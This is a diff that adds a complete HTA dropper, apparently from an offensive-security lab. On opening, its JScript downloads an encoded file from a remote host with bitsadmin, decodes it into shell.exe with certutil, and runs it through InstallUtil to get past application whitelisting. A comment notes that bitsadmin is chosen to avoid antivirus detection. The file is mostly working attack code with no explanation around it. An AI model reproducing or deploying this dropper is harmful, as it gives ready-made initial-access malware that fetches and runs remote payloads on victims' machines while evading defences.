@@ -1,0 +1,25 @@
+<html>
+<head>
+<script language="JScript">
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    // Use bitsadmin to download clm.txt (less AV-triggering than PowerShell)
+    shell.Run("bitsadmin /transfer myjob /download /priority FOREGROUND http://192.168.45.241/clm.txt C:\\Windows\\Tasks\\clm.txt", 0, true);
+    // Decode the file
+    shell.Run("powershell certutil -decode C:\\Windows\\Tasks\\clm.txt C:\\Windows\\Tasks\\shell.exe", 0, true);
+    // Run InstallUtil on the EXE
+    shell.Run("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\shell.exe", 0, false);
+    // Log success
+    shell.Run("cmd.exe /c echo HTA executed with bitsadmin > C:\\hta_log.txt", 0, false);
+} catch (e) {
+    // Log error
+    shell.Run("cmd.exe /c echo HTA error: " + e.message + " > C:\\hta_error.txt", 0, false);
+}
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>
